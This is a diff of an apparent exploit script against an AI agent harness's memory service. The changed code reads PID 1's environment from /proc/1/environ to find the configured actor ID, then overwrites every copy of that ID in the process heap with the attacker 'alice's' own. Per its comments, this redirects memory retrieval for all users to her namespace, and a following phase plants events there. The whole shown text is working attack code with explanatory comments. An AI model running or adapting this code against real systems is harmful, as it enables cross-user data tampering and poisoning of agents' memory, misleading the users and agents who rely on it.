@@ -244,53 +244,59 @@ def main():
 
     print(f"\nPHASE=MUTATION")
 
-    if configured_actor and alice_actor and configured_actor != alice_actor:
-        # The target: the resolved namespace with the configured actorId
-        target_ns = f"/tips/actors/{configured_actor}/"
-        # The replacement: alice's namespace
-        replacement_ns = f"/tips/actors/{alice_actor}/"
+    # The mutation strategy: alice does NOT need to know any victim's actorId.
+    # She reads the CONFIGURED actorId from /proc/1/environ (AWS_MEMORY_ACTOR_ID)
+    # and replaces ALL occurrences of that string in PID 1's heap with her own sub.
+    # This works because:
+    #   - The harness resolves {actorId} at runtime using the configured value
+    #   - The resolved namespace string lives in PID 1's heap as a Python string
+    #   - After mutation, the resolved namespace points to alice's path
+    #   - Alice doesn't need to know WHO the configured actor is — she just
+    #     finds it and overwrites it with herself
+    #
+    # If configured_actor == alice_actor (alice IS the configured actor), the
+    # namespace already points to alice. No mutation needed — extraction already
+    # writes to the retrieval namespace. This is the "shared namespace" case.
 
-        # Pad/trim to same length if needed (UUID subs may differ by a char)
-        if len(target_ns) != len(replacement_ns):
-            # Pad the shorter one with trailing bytes to match length
-            max_len = max(len(target_ns), len(replacement_ns))
-            target_ns = target_ns.ljust(max_len, '/')
-            replacement_ns = replacement_ns.ljust(max_len, '/')
+    if not configured_actor:
+        # Can't find what to overwrite — try scanning heap for UUID-shaped strings
+        # near namespace patterns
+        print(f"MUTATION_SKIP=no_configured_actor_found")
+    elif configured_actor == alice_actor:
+        print(f"MUTATION_SKIP=alice_IS_configured_actor_already_retrieves_from_alice_ns")
+        print(f"MUTATION_NOTE=no_mutation_needed_extraction_already_targets_retrieval_path")
+    else:
+        # The key case: configured actor ≠ alice. Alice overwrites it.
+        # She doesn't need to know it's "bob" — she just replaces whatever she found.
+        print(f"MUTATION_CONFIGURED_ACTOR_FOUND={configured_actor}")
+        print(f"MUTATION_REPLACING_WITH={alice_actor}")
 
-        target_bytes = target_ns.encode('utf-8')
-        replacement_bytes = replacement_ns.encode('utf-8')
+        # Strategy: replace the configured actorId with alice's actorId everywhere
+        # in PID 1's heap. This catches:
+        #   - The resolved namespace string ("/tips/actors/<configured>/")
+        #   - The config.actor_id attribute
+        #   - Any other reference to the configured actor
 
-        print(f"MUTATION_TARGET={target_ns}")
-        print(f"MUTATION_REPLACEMENT={replacement_ns}")
-        print(f"MUTATION_LEN={len(target_bytes)}")
+        target_bytes = configured_actor.encode('utf-8')
+        replacement_bytes = alice_actor.encode('utf-8')
 
+        # UUID subs are typically 36 chars (8-4-4-4-12 with hyphens)
+        # If lengths differ, pad the shorter one
+        if len(target_bytes) != len(replacement_bytes):
+            max_len = max(len(target_bytes), len(replacement_bytes))
+            target_bytes = target_bytes.ljust(max_len, b'\x00')
+            replacement_bytes = replacement_bytes.ljust(max_len, b'\x00')
+
+        print(f"MUTATION_TARGET_LEN={len(target_bytes)}")
         mutations = find_and_mutate_namespace(target_bytes, replacement_bytes)
         print(f"MUTATION_COUNT={mutations}")
 
         if mutations > 0:
             print(f"MUTATION_RESULT=SUCCESS")
-            print(f"MUTATION_EFFECT=harness_now_retrieves_from_alice_namespace_for_all_users")
+            print(f"MUTATION_EFFECT=all_refs_to_configured_actor_now_point_to_alice")
+            print(f"MUTATION_NOTE=harness_retrieval_now_resolves_to_alice_namespace")
         else:
-            # Try alternate patterns — maybe the namespace is stored differently
-            # Try without leading slash, or with different formats
-            for alt_target in [
-                f"tips/actors/{configured_actor}/",
-                f"/tips/actors/{configured_actor}",
-                configured_actor,  # just the actorId string itself
-            ]:
-                alt_replacement = alt_target.replace(configured_actor, alice_actor)
-                if len(alt_target) == len(alt_replacement):
-                    m = find_and_mutate_namespace(alt_target.encode(), alt_replacement.encode())
-                    if m > 0:
-                        print(f"MUTATION_ALT_TARGET={alt_target}")
-                        print(f"MUTATION_ALT_COUNT={m}")
-                        mutations += m
-                        break
-
-            if mutations == 0:
-                print(f"MUTATION_RESULT=TARGET_NOT_FOUND_IN_HEAP")
-    else:
-        print(f"MUTATION_SKIP=same_actor_or_missing_info")
+            print(f"MUTATION_RESULT=TARGET_NOT_FOUND_IN_HEAP")
 
     # --- Phase 2: Plant events ---
     print(f"\nPHASE=PLANT")
